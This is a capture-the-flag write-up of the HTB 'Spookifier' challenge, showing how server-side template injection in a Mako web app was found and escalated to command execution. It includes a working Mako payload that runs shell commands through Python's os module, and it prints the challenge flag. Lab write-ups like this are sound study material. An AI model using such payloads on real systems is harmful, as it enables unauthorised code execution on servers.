# 🎃 Spookifier - HTB Challenge

## 🧠 Overview

This challenge consisted of a web application that takes user input and transforms it using a backend template engine.

No traditional scanning or enumeration tools were required. The vulnerability was entirely within how user input was processed server-side.

---

## 🔍 Initial Approach

At first glance, the application simply modified and returned user input.

Basic interaction showed:

* User input was reflected in the response
* No obvious sanitization was present

This suggested testing for injection vulnerabilities.

---

## 🌐 Web Analysis

To test for template injection, a simple payload was used:

```
${7*7}
```

The server returned:

```
49
```

This confirmed that the input was being evaluated, not just rendered as plain text.

---

## 🧠 Key Discovery

The behavior indicated a **Server-Side Template Injection (SSTI)** vulnerability.

By reviewing the provided source code, it was discovered that the application used the **Mako** template engine.

Since Mako allows embedded Python execution, this opened the door to full code execution if the template context could be accessed.

---

## 💣 Exploitation

The next step was to escalate the SSTI to Remote Code Execution (RCE).

Using knowledge of Mako internals, it was possible to access Python’s global scope through the `self` object.

Final payload:

```python
${self.__init__.__globals__['os'].popen('cat /flag.txt').read()}
```

### Explanation

* `self.__init__.__globals__` → access to global variables
* `['os']` → import the `os` module
* `.popen('cat /flag.txt')` → execute system command
* `.read()` → return command output

---

## 🚩 Flag Retrieval

The key detail during exploitation was understanding that:

* Executing a command is not enough
* The output must be returned to the template response

Using `cat /flag.txt` ensured the flag content was printed and captured.

---

## 🏁 Result

Successful exploitation of the SSTI vulnerability led to Remote Code Execution and allowed reading the flag file from the system.

```
HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}
```

![HTB Congrats](screenshots/congrats.png)

---
